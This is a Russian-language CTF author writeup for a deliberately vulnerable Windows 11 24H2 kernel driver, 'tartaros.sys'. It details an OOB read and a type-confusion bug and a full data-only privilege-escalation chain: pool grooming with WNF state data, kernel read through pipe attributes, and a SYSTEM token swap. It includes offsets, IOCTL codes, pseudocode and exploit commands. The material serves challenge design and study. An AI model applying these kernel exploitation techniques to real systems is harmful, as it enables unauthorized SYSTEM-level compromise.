# TARTAROS — writeup

Windows 11 24H2 (build `26100.9711`), kernel LPE из low-IL/AppContainer.
Драйвер `tartaros.sys`, цель — data-only token swap, без shellcode/ROP.

---

## 0. Кратко

В драйвере есть два связанных бага:

1. **BIND_VIEW** отдаёт `Count` (до `0xC0`) байт из 0x30-байтного inline-буфера
   `TASK`. Это relative OOB read за пределы 0x90-байтного объекта в соседний
   paged-pool чанк.
2. **RETYPE + COMMIT** — type confusion: `Type` меняется на `LARGE`, union не
   переинициализируется, `COMMIT` трактует байты, записанные `BIND`, как
   `{Offset, Length, Data}` и делает одну qword-запись relative или absolute.

Из этого строится цепочка:

```
BIND OOB read  ->  найти соседний _WNF_STATE_DATA
relative write ->  раздуть AllocatedSize/DataSize до 0x1000
NtQueryWnfStateData -> relative pool read
relative read  ->  _WNF_SUBSCRIPTION.Process = наш _EPROCESS
                 + pipe attribute = arbitrary kernel read
ActiveProcessLinks -> System (PID 4) -> System token
absolute COMMIT    -> записать System token в EPROCESS.Token
                   -> SYSTEM, флаг, SYSTEM-shell
```

На стенде с restricted-токеном (custom SID, только `SeChangeNotifyPrivilege`)
`NtUpdateWnfStateData` возвращает `0xC0000022`, поэтому intended-стадия 4
недоступна. Для этого в драйвере есть скрытая авторская ветка
`BIND_VIEW → LOOKUP` (`--hidden`), которая даёт kernel read без WNF. Она
описана в конце.

---

## 1. Артефакты и target

Игроку/стенду:

```
tartaros.sys                 уязвимый драйвер
ntoskrnl.exe                 целевой 26100.9711 (для оффсетов)
exploit_26100.exe            reference exploit (26100)
```

Авторские файлы:

```
exploit/exploit.c            исходник эксплойта
include/tartaros_api.h       ABI драйвера
include/offsets_26100.h      оффсеты из PDB 26100.9711
tools/ntoffsets.py           PDB -> offsets header
docs/HIDDEN-VIEW.md          описание hidden-ветки
docs/DRIVER-HARDENING.md     что усложнено в драйвере
```

Устройство: `\\.\Tartaros`, SDDL `D:(A;;GA;;;WD)(A;;GA;;;AC)` — открывается
из low-IL/AppContainer.

---

## 2. Рекон драйвера

### 2.1 IOCTL

Диспетчер не сравнивает код напрямую: он считает хэш и ищет его в таблице.
В текущей сборке:

```
hash = byteswap(ROTL(code ^ 0xA5A5A5A5, 13) ^ ROTR(code, 7)) ^ 0x51ED270B
```

Таблица `g_Dispatch` при `DriverEntry` ксорится per-boot ключом
(`g_DispatchKey`), поэтому в бинаре лежат не готовые хэши, а encoded qword-ы.
Логические IOCTL-коды:

| IOCTL | Код | Смысл |
| --- | --- | --- |
| CREATE | `0x22200010` | `IDLE → ARMED`, аллокация TASK |
| BIND | `0x22200030` | `ARMED → PRIMED`, запись union + view |
| RETYPE | `0x22200074` | `PRIMED → RETYPED`, смена вида view |
| COMMIT | `0x222000AC` | `RETYPED → IDLE`, qword write |
| RESET | `0x222000D8` | сброс в IDLE |
| PING / VERSION / SYNC | `0x22200104/13C/160` | заглушки |
| LOOKUP | `0x22200190` | обычно `STATUS_NOT_FOUND` |
| STATE / PEEK / POKE | `0x222001B8/E0/204` | только debug-сборка |

Для реверса: `IRP_MJ_DEVICE_CONTROL` → `TarDeviceControl` → `TarDispatch`;
дальше ищем init-цикл, который ксорит таблицу, и декодируем handler-ы.

### 2.2 State machine

На каждый `FILE_OBJECT` — контекст:

```
IDLE -> ARMED -> PRIMED -> RETYPED -> COMMIT/IDLE
```

* `CREATE`/`RESET` — бесплатны;
* `BIND` требует `ARMED`;
* `RETYPE` требует `PRIMED`;
* `COMMIT` требует `RETYPED`;
* неверный переход — `TarViolation`: TASK освобождается, состояние `IDLE`,
  минус один выстрел;
* бюджет — 8 выстрелов на handle; `COMMIT` тоже тратит выстрел.

`State` в контексте хранится как `real_state ^ StateKey` (per-handle);
`TARAROS_SIMPLE_OUT.State` возвращает уже логическое значение.

### 2.3 TASK

`0x90` байт, paged lookaside, размерный класс `0xA0`:

```
+0x00  ULONG   Cookie       per-boot secret ^ address
+0x04  USHORT  Type         logical kind; в памяти encoded per-boot
+0x06  USHORT  Count        размер view, 0..0xC0
+0x08  union   u            inline[0x30] / large descriptor
+0x38  UCHAR   Tail[0x58]   metadata tail (в Tail[0] лежит view seed)
```

Pool tag в текущей сборке генерируется per-boot, поэтому искать объект по
`'TART'` в дампе пула нельзя.

### 2.4 Cookie

`Cookie = f(TASK address, g_CookieSecret)`. `COMMIT` проверяет cookie;
если перезаписать заголовок TASK (например, наивным overflow в соседний
TASK), будет `KeBugCheckEx(0xDEADC0DE,...)`. Поэтому OOB read из бага A
обязателен: он не трогает cookie.

---

## 3. Баг A — BIND_VIEW OOB read

`BIND` принимает `TARTAROS_BIND_IN`:

```
+0x00  ULONG Count         0..0xC0
+0x04  UCHAR Data[0x30]
```

Драйвер копирует `Data` в `TASK->u.Inline`, ставит `Type=SMALL`,
`Count=user` и отдаёт `Count` байт обратно. Источник — inline-буфер 0x30,
но `Count` разрешён до 0xC0, а `TASK` — 0x90. Фактически copy идёт
`inline (0x30) + Tail (0x58) + сосед (0x38)`. Выход `TARTAROS_BIND_OUT`:

```
+0x00  LONG  Status
+0x04  ULONG Length
+0x08  UCHAR Bytes[0xC0]     ; Bytes[0] = TASK+0x08
```

Layout `Bytes`:

```
[0x00..0x2F]  inline
[0x30..0x87]  Tail
[0x88..]      соседний pool-чанк (0xA0 block)
```

`Cookie` (`TASK+0x00`) не попадает в утечку, поэтому её нельзя случайно
испортить этим чтением. В `Bytes[0x88]` виден заголовок следующего чанка
(например, `_WNF_STATE_DATA`), а в `Tail[0]` — view seed (см. hidden-ветку).

### Grooming

Цель — положить сразу за TASK `_WNF_STATE_DATA`:

1. `NtCreateWnfStateName` + `NtUpdateWnfStateData` создаёт state data
   длиной `0x80` с магией `TARWNF01` + индекс.
2. TASK и state data — оба в paged pool размерного класса `0xA0`.
3. Эксплойт делает interleave: `CREATE` TASK, затем WNF state data,
   затем `BIND Count=0xC0` и сканирует утечку на `TARWNF01`.
4. Если сосед не тот — новые TASK/state data; есть retry (до 3 попыток),
   `--drain` для исчерпания lookaside и `--spray-holes`.

`_WNF_STATE_DATA`:

```
+0x00  Header
+0x04  AllocatedSize
+0x08  DataSize
+0x0C  ChangeStamp
+0x10  Data          <- здесь лежит TARWNF01 + index
```

В утечке `DataSize` и `AllocatedSize` находятся по смещениям
`magicOff-0x08` и `magicOff-0x0C`; эксплойт вычисляет их из магии, не
полагаясь на фиксированный размер pool-заголовка. В типовом layoute
`magic` оказывается на `TASK+0xB0`, то есть `_WNF_STATE_DATA` — на
`TASK+0xA0`, `AllocatedSize` — `TASK+0xA4`, `DataSize` — `TASK+0xA8`.

---

## 4. Баг B — RETYPE/COMMIT type confusion

`BIND` пишет 0x30 байт в union. `RETYPE` меняет `Type` на `LARGE`, но
**не** переинициализирует union. `COMMIT` читает:

```
u.Large.Offset  (+0x00)
u.Large.Length  (+0x08)
u.Large.Data    (+0x10)
```

и делает одну запись `length=8`:

* **relative**: `Offset` — небольшое смещение от TASK, `Offset >= 0x90`,
  `Offset <= Count`, `Offset+8 <= Count`; цель `TASK+Offset`;
* **absolute**: `Offset` — kernel VA (верхние 16 бит ненулевые), проверка
  `MmIsAddressValid`; цель — `Offset`.

`RETYPE` дополнительно кладёт descriptor tag в `u.Large.Reserved`;
`COMMIT` его проверяет, но это не мешает type confusion: tag считается по
тем же `Offset/Length/Data`, которые задал `BIND`.

`COMMIT` освобождает TASK, ставит `IDLE`, тратит выстрел.

---

## 5. Intended-цепочка

### 5.1 Стадия 1: BIND OOB read

1. `CREATE` — TASK.
2. `BIND Count=0xC0` — утечка 0xC0 байт.
3. Сканируем `Bytes` на `TARWNF01` + индекс; проверяем, что `DataSize` и
   `AllocatedSize` правдоподобны.
4. Если нашли — запоминаем offsets; иначе новый TASK/state data.

### 5.2 Стадия 2: relative write → relative read

Нужно раздуть `AllocatedSize` и `DataSize` соседнего `_WNF_STATE_DATA` до
`0x1000`. Оба dword-а лежат рядом, поэтому одна unaligned qword-запись
покрывает их:

```
old = *(u64 *)(leak + base);           // base = min(DataSizeOff, AllocSizeOff)
new = PatchDword(PatchDword(old, ...), ..., 0x1000);
CommitOffset = base + 0x08;             // TASK union starts at TASK+0x08
```

В типовом layoute `CommitOffset = 0xA4`, значение `0x0000100000001000`
(DataSize=0x1000, AllocatedSize=0x1000). Для этого:

```
BIND Count=0xC0 Data={Offset=0xA4, Length=8, Data=0x0000100000001000}
RETYPE
COMMIT
```

После этого `NtQueryWnfStateData` считает, что данных 0x1000, и копирует
0x1000 байт из `_WNF_STATE_DATA+0x10` — relative pool read.

### 5.3 Стадия 3: subscription → EPROCESS без KASLR

`NtSubscribeWnfStateChange` создаёт `_WNF_SUBSCRIPTION` (0x88, тот же
класс 0xA0). Подписки/pipe attributes грумятся так, чтобы попасть в окно
relative read.

`_WNF_SUBSCRIPTION`:

```
+0x00  Header (0x00880905)
+0x10  SubscriptionId
+0x28  Process          <- наш _EPROCESS
+0x30  NameInstance
+0x38  StateName
```

Эксплойт перебирает окно, ищет `Header`, сверяет `SubscriptionId` с
возвращённым `NtSubscribeWnfStateChange`, затем читает `Process` и
проверяет `EPROCESS.UniqueProcessId == GetCurrentProcessId()`. Это даёт
**свой EPROCESS без знания базы ntoskrnl**.

Далее — обход `ActiveProcessLinks`:

```
link = eproc + OFF_EPROCESS_ACTIVEPROCESSLINKS;  // +0x1d8
next = *(u64 *)link;                              // Flink
candidate = next - 0x1d8;
pid = *(u32 *)(candidate + 0x1d0);                // UniqueProcessId
if (pid == 4) systemEproc = candidate;
```

Читаем `System EPROCESS->Token` (`+0x248`).

### 5.4 Стадия 4: pipe attribute → arbitrary read

Относительного окна 0x1000 не всегда хватает до `PsInitialSystemProcess`,
поэтому нужен absolute/arbitrary read. Рядом с WNF data грумится pipe
attribute (`npfs.sys`, tag `NpAt`, блок 0xA0):

```
+0x00  Flink
+0x08  Blink
+0x10  Name
+0x18  ValueLength
+0x20  AttributeValue
+0x28  inline name (9 bytes)
+0x31  inline value (0x5F)
```

Атрибут создаётся через `FSCTL_PIPE_SET_ATTRIBUTE` (`0x11003C`), читается
через `FSCTL_PIPE_GET_ATTRIBUTE` (`0x110038`), удаляется через
`0x110034`. Имя 9 байт + значение 0x5F → запрос 0x90 → чанк 0xA0.

Эксплойт находит `NpAt` в relative read, затем через `NtUpdateWnfStateData`
(или relative write) перезаписывает `ValueLength` и `AttributeValue`:
`ValueLength = outLen`, `AttributeValue = kernel VA`. Соседство WNF data и
атрибута позволяет дотянуться до его полей. После этого

```
FSCTL_PIPE_GET_ATTRIBUTE(name)
```

копирует `outLen` байт с выбранного kernel VA в user buffer. Это
`PipeReadN/PipeRead64`.

Если подписка не попала в первое окно 0x400, эксплойт:
1. берёт из inline-value атрибута absolute адрес WNF data;
2. считает безопасный хвост до конца страницы;
3. раздувает `DataSize` до этого хвоста и делает безопасный read;
4. только в крайнем случае делает полный 0x1000 read (может пересечь
   unmapped page).

### 5.5 Стадия 5: KASLR fallback

Основной путь на 24H2 — subscription (без базы `nt`). Если подписка не
найдена, есть fallback: найти базу `nt` (module list/IDT/pointer leak),
прочитать `PsInitialSystemProcess` (`OFF_PSINITIALSYSTEMPROCESS`), проверить
PID 4, взять токен и пройти `ActiveProcessLinks` до своего EPROCESS.
На 24H2 `SystemModuleInformation`/`EnumDeviceDrivers` требуют
`SeDebugPrivilege`, поэтому fallback по умолчанию выключен (`--nt-fallback`
включает).

### 5.6 Стадия 6: absolute write → SYSTEM

`TaskAbsoluteWrite`:

```
BIND Count=0xC0 Data={Offset=eproc+0x248, Length=8, Data=systemToken}
RETYPE
COMMIT
```

`COMMIT` идёт в absolute-ветку, проверяет `MmIsAddressValid` и пишет qword
в `EPROCESS.Token`. Младшие 3 бита token pointer — refcount; эксплойт
выставляет их в 7 (`writeToken++`, если нужно), чтобы не потерять
reference.

После записи:

* `VerifySystemToken()` — `OpenProcessToken` + `TokenUser`, проверка
  `S-1-5-18`;
* `TryReadFlag()` — чтение SYSTEM-only файла;
* `SpawnSystemShell()` — `cmd.exe /c ...` или интерактивный `cmd.exe`.

Это data-only: никакого shellcode, ROP, SSDT/IDT, обхода KDP; PatchGuard
не трогается.

---

## 6. Stand/low-IL fallback: `--hidden`

На стенде токен участника — Low integrity, custom SID, только
`SeChangeNotifyPrivilege`. `NtUpdateWnfStateData` возвращает
`STATUS_ACCESS_DENIED` (`0xC0000022`), поэтому стадия 4 intended-цепочки
недоступна. Для стенда в драйвере есть скрытая авторская ветка.

### 6.1 Схема

Отдельного IOCTL нет:

* `BIND Count=0xC0` с digest-ом только ставит `Ctx->ViewArmed`;
* `LOOKUP` (в обычном состоянии всегда `STATUS_NOT_FOUND`) при поднятом
  флаге выполняет чтение.

Digest привязан к per-boot seed-у. Seed лежит в `TASK->Tail[0]`; обычный
`BIND Count=0xC0` (баг A) отдаёт его в leak по смещению `0x30`. Без
обычной утечки hidden-путь не активировать.

### 6.2 Протокол

`BIND` (`TARTAROS_BIND_IN`, Data[0x30]):

```
Data + 0x00  ULONG   digest
Data + 0x04  ULONG64 address     ; 0 = probe
Data + 0x0C  ULONG   size        ; 1..0x1000
Data + 0x10  ULONG   key         ; 0 для probe
Data + 0x14  ...     filler
```

`seed = *(ULONG *)(leak.Bytes + 0x30)`.

```
h = 0x1F123BB5 ^ seed
for b in Data[0x04..0x2F]:
    h ^= b
    h = rotl32(h, 7) ^ 0x9E3779B9
digest = h ^ rotl32(seed, 13)
digest ^= ((0xC0 << 16) | 1) ^ 0x6D3B91A7
```

`LOOKUP` (input пустой, output — `TARTAROS_BIND_OUT`):

* probe (`address=0`, `size=12`, `key=0`) → `Status=0`, `Length=12`,
  `Bytes[0..7]=EPROCESS`, `Bytes[8..11]=ViewKey`;
* read (`address=kernel VA`, `size=1..0x1000`,
  `key = Digest({address,size,ViewKey}, seed)`) → `Status=0`,
  `Length=size`, data.

Драйвер проверяет `Pad == per-boot session`, ключ и
`MmIsAddressValid` для страниц адреса.

### 6.3 Цепочка `--hidden`

1. Обычный `BIND Count=0xC0` → seed из `0x30`.
2. BIND probe + LOOKUP → `EPROCESS` + `ViewKey`.
3. Чтение `EPROCESS`, обход `ActiveProcessLinks` до PID 4.
4. Чтение `System EPROCESS->Token`.
5. Отдельный handle: `CREATE → BIND(write payload) → RETYPE → COMMIT` —
   absolute write в `EPROCESS.Token`.
6. `VerifySystemToken` / `--flag` / `--cmd` / `--shell`.

Каждое чтение — `RESET → CREATE → BIND → LOOKUP`; выстрелы не тратятся,
потому что `COMMIT` на читающем handle не вызывается. Seed кэшируется;
при смене драйвера helper перечитывает его и повторяет попытку.

Подробности: `docs/HIDDEN-VIEW.md`.

---

## 7. Оффсеты 26100.9711

Из `include/offsets_26100.h` (генерируются `tools/ntoffsets.py` из
`ntkrnlmp.pdb`):

| Поле | Offset |
| --- | --- |
| `_EPROCESS.UniqueProcessId` | `0x1d0` |
| `_EPROCESS.ActiveProcessLinks` | `0x1d8` |
| `_EPROCESS.Token` | `0x248` |
| `_EPROCESS.WnfContext` | `0x5e8` |
| `PsInitialSystemProcess` | `0xfc6ab0` |
| `_WNF_STATE_DATA.AllocatedSize` | `0x4` |
| `_WNF_STATE_DATA.DataSize` | `0x8` |
| `_WNF_STATE_DATA.Data` | `0x10` |
| `_WNF_SUBSCRIPTION.SubscriptionId` | `0x10` |
| `_WNF_SUBSCRIPTION.Process` | `0x28` |
| `_WNF_SUBSCRIPTION.NameInstance` | `0x30` |
| `_WNF_SUBSCRIPTION.StateName` | `0x38` |
| `_WNF_NAME_INSTANCE.StateData` | `0x58` |
| `_WNF_NAME_INSTANCE.CreatorProcess` | `0x98` |

`_KTHREAD.ApcState.Process` для hidden probe: `gs:[0x188] + 0xB8`
(то есть `_KTHREAD.ApcState` `0x98` + `_KAPC_STATE.Process` `0x20`).

---

## 8. Сборка и запуск

### Локально (Win10 19042)

```powershell
# драйвер + user tools
powershell -NoProfile -ExecutionPolicy Bypass -File .\scripts\build.ps1 -Sign

# установка/старт (elevated)
scripts\local-setup.ps1 -Driver dist\tartaros.sys
scripts\local-start.ps1

dist\tartctl.exe ping
dist\tartctl.exe leak 0xC0 pattern

# intended WNF-цепочка
dist\exploit.exe patch --full --cmd "whoami"

# hidden-ветка
dist\exploit.exe --hidden --cmd "whoami"

# низкий IL: restricted token + Low integrity + pipe stdout
dist\lowrun.exe dist\exploit.exe --hidden --cmd "whoami"
```

### Стенд 26100.9711

На стенде эксплойт лежит как `X:\work\1.exe` (тот же
`exploit_26100.exe`), драйвер — `X:\work\tartaros.sys`.

```cmd
X:\work\1.exe --hidden --cmd "X:\work\whoami.exe"
```

Ожидаемый хвост:

```
[+] hidden: EPROCESS = ffff...
[+] hidden: System EPROCESS=... token=...
[+] current token SID is SYSTEM (S-1-5-18)
[+] spawned 'cmd.exe /c ...' ... with SYSTEM token
nt authority\system
```

`whoami` нужно вызывать полным путём: в WinPE `whoami.exe` может не быть
в PATH. Для флага:

```cmd
X:\work\1.exe --hidden --flag C:\flag.txt
```

Если intended WNF-путь запускается от SYSTEM (например, через
`--hidden --cmd "X:\work\run_system.cmd"`), он тоже проходит:

```
[+] own EPROCESS = ...
[+] System EPROCESS = ... token = ...
[+] current token SID is SYSTEM (S-1-5-18)
```

---

## 9. Где исходник эксплойта

Основной файл:

```
exploit/exploit.c
```

Ключевые функции:

| Функция | Что делает |
| --- | --- |
| `InterleaveGroom` | TASK + WNF interleave, поиск соседнего state data |
| `AnalyseNeighbor` | парсит утечку, находит `TARWNF01`, `DataSize/AllocatedSize` |
| `BuildPatches` | строит unaligned qword для полей WNF |
| `TaskRelativeWrite` | `BIND → RETYPE → COMMIT` relative |
| `TaskAbsoluteWrite` | `BIND → RETYPE → COMMIT` absolute |
| `WnfWrite` / `NtQueryWnfStateData` | relative WNF read/write |
| `FindPipeAttribute` | ищет `NpAt` в relative read |
| `PipeReadN` / `PipeRead64` | arbitrary kernel read через pipe attribute |
| `EprocessFromSubscription` | `_WNF_SUBSCRIPTION.Process` → EPROCESS |
| `SystemTokenFromLinks` | `ActiveProcessLinks` → PID 4 → token |
| `SwapOurToken` | absolute write в `EPROCESS.Token` |
| `TarViewEnsureSeed` | hidden: seed из обычного BIND |
| `TarBlindReadOnce` | hidden: BIND + LOOKUP + keyed read |
| `RunHidden` | hidden-цепочка целиком |
| `RunStages` | intended-цепочка целиком |

Сборка:

* `dist/exploit.exe` — оффсеты локальной Win10 19041;
* `dist/exploit_26100.exe` — `-DTARGET_26100`, оффсеты 26100.9711.

Дополнительные утилиты:

* `user/tartctl.c` — CREATE/BIND/RETYPE/COMMIT/leak/state;
* `tools/lowrun.c` — Low-IL restricted token launcher;
* `tools/unloaddrv.c` — `NtUnloadDriver` для hot-swap драйвера на стенде.

---

## 10. Reliability и митигации

* **Grooming** — interleave TASK/WNF, до 3 retry, `--drain` lookaside,
  `--spray-holes`; при неудаче — новый handle (свой бюджет 8 выстрелов).
* **Relative read** — первый read 0x400, затем безопасное расширение до
  конца страницы; полный 0x1000 — только последний resort.
* **No KASLR** — основной путь через `_WNF_SUBSCRIPTION.Process`; база
  `ntoskrnl` не нужна.
* **Data-only** — ни shellcode, ни ROP, ни SSDT/IDT; только pool write и
  `EPROCESS.Token`. PatchGuard/KDP не затрагиваются.
* **HVCI/kCFG/kCET** — не используются control-flow примитивы; token swap
  остаётся data-only.
* **Token refcount** — младшие 3 бита указателя выставляются в 7, чтобы
  процесс не потерял reference на SYSTEM token.

---

## 11. Замечания

* `tartaros.sys` в релизе идёт без PDB; обработчики в бинаре не подписаны
  именами, таблица диспетчера encoded, `State`/`Type` закодированы,
  pool tag/session per-boot. Это усложняет статический реверс, но не
  меняет ABI.
* Hidden-ветка — авторский fallback для стенда с запрещённым WNF update.
  Для «чистого» player-релиза её можно не включать или вынести в
  отдельную сборку.
* Если анализировать исходники/репозиторий, а не только `.sys`, все
  intended-баги видны по коду; для честного теста игроку/LLM нужно давать
  только `tartaros.sys` и `ntoskrnl.exe`.
